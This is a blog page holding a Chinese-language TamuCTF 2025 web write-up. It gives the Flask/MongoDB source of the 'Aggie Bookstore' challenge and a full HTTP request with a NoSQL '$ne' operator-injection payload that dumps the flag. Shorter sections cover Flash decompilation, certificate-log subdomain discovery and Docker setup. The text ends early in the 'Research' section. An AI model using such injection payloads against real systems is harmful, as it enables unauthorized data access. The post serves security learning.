<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="奇奇怪怪的">
<meta property="og:type" content="article">
<meta property="og:title" content="TamuCTF2025(web全)">
<meta property="og:url" content="https://baozongwi.xyz/posts/1be23388.html">
<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
<meta property="og:description" content="奇奇怪怪的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250329-161557.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250329-154258.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250331-124148.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250331-161631.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250330-214721.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250330-221929.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250331-175409.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250331-180630.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250329-165819.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250329-213835.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250331-130459.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250331-131335.jpg">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250331-131715.jpg">
<meta property="article:published_time" content="2025-03-29T01:31:22.000Z">
<meta property="article:modified_time" content="2025-08-08T04:13:15.706Z">
<meta property="article:author" content="baozongwi">
<meta property="article:tag" content="Nosql">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/2025/3/TamuCTF2025/QQ20250329-161557.jpg">


<link rel="canonical" href="https://baozongwi.xyz/posts/1be23388.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/1be23388.html","path":"posts/1be23388.html","title":"TamuCTF2025(web全)"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>TamuCTF2025(web全) | baozongwi:H@cking Th3 Fu1ure</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>

  <script src="/js/third-party/pace.js" defer></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Aggie-Bookstore-160-solves"><span class="nav-number">1.</span> <span class="nav-text">Aggie Bookstore(160 solves)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-108-solves"><span class="nav-number">2.</span> <span class="nav-text">Impossible(108 solves)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Transparency-99-solves"><span class="nav-number">3.</span> <span class="nav-text">Transparency(99 solves)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Research-7-solves"><span class="nav-number">4.</span> <span class="nav-text">Research(7 solves)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Modern-Banking-7-solves"><span class="nav-number">5.</span> <span class="nav-text">Modern Banking(7 solves)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forward-to-the-Past-53-solves"><span class="nav-number">6.</span> <span class="nav-text">Forward to the Past(53 solves)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Moving-Slowly-84-solves"><span class="nav-number">7.</span> <span class="nav-text">Moving Slowly(84 solves)</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baozongwi"
      src="/images/acvtar.jpg">
  <p class="site-author-name" itemprop="name">baozongwi</p>
  <div class="site-description" itemprop="description">天地不仁，以万物为刍狗</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baozongwi" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:baozongwi@qq.com" title="E-Mail → mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>
<ul>
  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
</ul>
        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/1be23388.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/acvtar.jpg">
      <meta itemprop="name" content="baozongwi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="天地不仁，以万物为刍狗">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="TamuCTF2025(web全) | baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="奇奇怪怪的">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          TamuCTF2025(web全)
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-03-29 09:31:22" itemprop="dateCreated datePublished" datetime="2025-03-29T09:31:22+08:00">2025-03-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-08-08 12:13:15" itemprop="dateModified" datetime="2025-08-08T12:13:15+08:00">2025-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">赛题</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>24k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>40 mins.</span>
    </span>
</div>

            <div class="post-description">奇奇怪怪的</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>首发于先知社区 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17519">https://xz.aliyun.com/news/17519</a></p>
<h2 id="Aggie-Bookstore-160-solves"><a href="#Aggie-Bookstore-160-solves" class="headerlink" title="Aggie Bookstore(160 solves)"></a>Aggie Bookstore(160 solves)</h2><p>这里的代码，对于我这个AI小子来说非常难看，但是看代码我们就不着急，慢慢一句一句的搞懂</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">client = MongoClient(<span class="string">&quot;mongodb://localhost:27017/&quot;</span>)</span><br><span class="line">db = client[<span class="string">&#x27;aggie_bookstore&#x27;</span>]</span><br><span class="line">books_collection = db[<span class="string">&#x27;books&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">input_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^a-zA-Z0-9\s]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, input_str)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/search&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    query = &#123;<span class="string">&quot;$and&quot;</span>: []&#125;</span><br><span class="line">    books = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        title = request.args.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        author = request.args.get(<span class="string">&#x27;author&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        title_clean = sanitize(title)</span><br><span class="line">        author_clean = sanitize(author)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> title_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: title_clean&#125;&#125;)  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> author_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: author_clean&#125;&#125;) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">            books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.content_type == <span class="string">&#x27;application/json&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = request.get_json(force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                title = data.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">                author = data.get(<span class="string">&quot;author&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(title, <span class="built_in">str</span>):</span><br><span class="line">                    title = sanitize(title)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(title, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(author, <span class="built_in">str</span>):</span><br><span class="line">                    author = sanitize(author)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(author, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">                    books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line">                    <span class="keyword">return</span> jsonify([</span><br><span class="line">                        &#123;<span class="string">&quot;title&quot;</span>: b.get(<span class="string">&quot;title&quot;</span>), <span class="string">&quot;author&quot;</span>: b.get(<span class="string">&quot;author&quot;</span>)&#125; <span class="keyword">for</span> b <span class="keyword">in</span> books</span><br><span class="line">                    ])</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Empty query&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unsupported Content-Type&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先看到是<code>mongodb</code>，并且过滤函数<code>sanitize</code>，过滤特殊字符，仅保留字母、数字、空格，<code>/index</code>什么东西都没有<code>/search</code>是一个数据库的查询，<code>$and</code> 是 MongoDB 的操作符，表示 <strong>同时满足所有条件</strong>（类似 SQL 的 <code>AND</code>），在<code>/search</code>的GET传参把所有的特殊字符过滤了，所以除了Unicode啥的基本不考虑了，不过这个路由开了POST，并且解析json，<code>$eq</code> 是 MongoDB 的等于”操作符（类似 SQL 的 <code>=</code>）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">    books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    books = [] </span><br></pre></td></tr></table></figure>

<p>进行查询，看完代码之后很明显的Nosql注入，冲</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>aggie-bookstore.tamuctf.com</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;134&quot;, &quot;Not:A-Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;134&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://aggie-bookstore.tamuctf.com/search?title=test&amp;author=test</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"></span><br><span class="line"><span class="language-bash">&#123;<span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;<span class="variable">$ne</span>&quot;</span>: <span class="string">&quot;&quot;</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>得到<code>FLAG&#123;nosql_n0_pr0bl3m&#125;</code></p>
<h2 id="Impossible-108-solves"><a href="#Impossible-108-solves" class="headerlink" title="Impossible(108 solves)"></a>Impossible(108 solves)</h2><p>先把游戏保存下来，访问<code>/impossible_ctf.swf</code>然后<strong>JPEXS Free Flash Decompiler</strong>用这个工具进行分析，这里面没有牵扯地址的问题，不然就是逆向了，用exe的启动方式打开</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250329-161557.jpg" alt="1"></p>
<p>这个和web关系真不大</p>
<h2 id="Transparency-99-solves"><a href="#Transparency-99-solves" class="headerlink" title="Transparency(99 solves)"></a>Transparency(99 solves)</h2><p>这个解题思路更像是渗透，</p>
<p><img src="/../images/achieve/2025/3/TamuCTF2025/QQ20250329-154258.jpg" alt="1"></p>
<p>题目意思已经很明确了，就是说每个人可以创造私域，其中有自己的文档，当我选择创建新文档的时候发现什么事情都没有发生，回显为</p>
<blockquote>
<p>New document creation is currently disabled following a request from law enforcement.</p>
</blockquote>
<p>那flag能在哪里呢，只能在之前创建的私域里面了，那我们需要去查域名<a target="_blank" rel="noopener" href="https://crt.sh/">https查询域名</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tve987yv.transparency.cybr.club/</span><br></pre></td></tr></table></figure>

<p>访问就是flag</p>
<h2 id="Research-7-solves"><a href="#Research-7-solves" class="headerlink" title="Research(7 solves)"></a>Research(7 solves)</h2><p>题目说明了五分钟重启一次，所以我们现在本地搭建一下docker，先把多余容器删了，再启动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker stop 27bea68fe303 &amp;&amp; docker rm 27bea68fe303 &amp;&amp; docker rmi 0fa340091225</span><br><span class="line"></span><br><span class="line">docker build -t my_php_nginx_app .</span><br><span class="line">docker run -d -p 8080:80 --name my_php_nginx_app my_php_nginx_app</span><br></pre></td></tr></table></figure>

<p>发现docker拉不下来，额，慢慢看代码吧，首先看<code>editor/editor.js</code>，</p>
